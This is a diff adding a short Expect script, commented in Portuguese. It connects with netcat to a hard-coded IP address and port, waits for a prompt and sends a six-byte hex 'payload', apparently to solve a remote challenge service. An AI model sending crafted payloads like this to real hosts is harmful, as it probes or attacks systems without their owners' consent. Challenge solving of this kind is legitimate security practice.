@@ -1,0 +1,16 @@
+#!/usr/bin/expect -f
+set timeout 15
+spawn nc 20.102.93.39 33376
+# espera até ver o prompt '>>> ' no output
+expect ">>> "
+# envia os bytes (hex) que correspondem ao payload, seguido de CR
+send -- "\xDB\xBE\x34\xD7\x8D\x37\r"
+# lê tudo que vier até EOF ou timeout e imprime
+expect {
+  -re "(.*)" {
+    puts $expect_out(0,string)
+    exp_continue
+  }
+  timeout { exit }
+  eof { exit }
+}
